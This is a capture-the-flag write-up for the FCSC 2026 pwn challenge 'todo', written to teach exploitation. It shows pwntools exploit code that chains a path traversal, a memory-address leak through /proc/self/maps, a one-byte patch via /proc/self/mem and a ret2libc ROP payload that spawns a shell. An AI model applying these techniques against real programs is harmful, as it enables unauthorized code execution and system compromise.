
# FCSC 2026 - PWN - todo

**Level** : :star::star:  
**Solves during the CTF** : 30  
**Description** :  
J'ai créé un programme pour noter les tâches à ne pas oublier mais j'ai quand même l'impression que ma mémoire me joue des tours...

# TL;DR

1. **Path traversal** on the filename input to read `/proc/self/maps` and **leak** PIE + libc bases.
2. **Arbitrary byte write** via `/proc/self/mem` : `edit_list` seeks to `index * 0x51 + 1` and writes one byte (`X`) -> used `/proc/self/mem` to patch memory.
3. **Patch `get_int`**: overwrite the `0x16` (size argument to `fgets`) with `0x58` (`'X'`), turning an input of 22 bytes into a 88 bytes one.
4. **ROP chain**: `get_int` now has an overflow, and we setup a classic `pop rdi ; ret` -> `/bin/sh` -> `system`.

---

# Description

The binary is a simple interactive todo-list manager:

```
Choose an option:
0. Exit
1. Create a to-do list
2. Read a to-do list
3. Mark as done
>
```

Three operations, each asking for a **list name**:

- **Create**: creates file `./lists/<name>`, reads items line by line, stores each item with the following pattern: `[ ] <item>\n`.
- **Read**: reads file `./lists/<name>`, print it to stdout.
- **Mark as done**: opens `./lists/<name>`, asks for an index, seeks to `index * 0x51 + 1`, and writes one byte : `'X'` (to turn `[ ]` into `[X]`).

Numbers are parsed via the function `get_int`, which calls `fgets` with a size of `0x16`.

## Protections

```
Arch:   amd64-64-little
RELRO:  Partial RELRO
Stack:  No canary found
NX:     NX enabled
PIE:    PIE enabled
```

---

# Vulnerabilities

## 1- Path traversal

None of the three operations sanitize the list name. The path is simply:

```c
strncpy(&filename, "./lists/", 0x80);
(...)
fopen(&filename, ...)
```

So `../../../../../../../../proc/self/maps` is a valid "list name". The binary happily opens it.

## 2- Arbitrary byte write via `/proc/self/mem`

`edit_list` computes the file seek position as:

```c
fseek(fp, get_int() * 0x51 + 1, SEEK_SET);
fwrite(&data_402092, 1, 1, fp);   // writes the byte 'X' (0x58)
```

The seek value is `index * 0x51 + 1`. If the file is `/proc/self/mem`, we can patch the memory with one byte, anywhere.

---

# Exploit

Of course, no flag.txt present in the main folder or in the parent folder, it would have been too easy...

## Step 1 : Leak PIE and libc via `/proc/self/maps`

We use the first vulnerability, with the file `/proc/self/maps` to leak the libc base address and the PIE:

```python
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'../../../../../../../../proc/self/maps')

maps_data = p.recvuntil(b'Choose an option:', timeout=5).decode('latin-1')

for line in maps_data.split('\n'):
    parts = line.strip().split()
    if len(parts) < 6:
        continue
    addr_range, perms, offset, *_, path = parts

    if path.endswith('/todo') and offset == '00000000' and pie_base is None:
        pie_base = int(addr_range.split('-')[0], 16)

    if 'libc' in path and offset == '00000000' and libc_base is None:
        libc_base = int(addr_range.split('-')[0], 16)
```

## Step 2 : Compute the magic index

We want to write at `pie_base + 0x11fd` (the `0x16` byte in `mov esi, 0x16` in `get_int` function).

The seek position is computed with `index * 0x51 + 1`.  
We know the target address and need to find the right index, so we just solve backwards: `index = (target - 1) / 0x51`.  
However since it is a 64-bit integer, we can't do regular division, instead we multiply by the modular inverse of 0x51, which is the equivalent of dividing in modular arithmetic. 

```python
target   = pie_base + 0x11fd
inv81    = pow(0x51, -1, 2**64)
index    = ((target - 1) * inv81) % (2**64)
```

Now we can write at whatever offset on the file.

## Step 3 — Patch `get_int` via `/proc/self/mem`

```python
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'> ', b'../../../../../../../../proc/self/mem')
p.sendlineafter(b'> ', str(index).encode())
```

The byte written is `'X'`, which turns `fgets(&buf, 0x16, stdin)` into `fgets(&buf, 0x58, stdin)` -> this will allow us to have an overflow.

## Step 4 — Stack overflow and ROP

Back in the main loop, the next `> ` prompt calls the patched `get_int` with a buffer overflow. 

Classic ret2libc:

```python
payload  = b'A' * 0x20           # fill buffer up to saved rbp
payload += p64(0xdeadbeef)       # saved rbp (don't care)
payload += p64(libc_base + POP_RDI_RET)
payload += p64(libc_base + BIN_SH)
payload += p64(libc_base + RET)  # stack alignment
payload += p64(libc_base + SYSTEM)

p.sendafter(b'> ', payload)
p.interactive()
```

*Et voilà*.
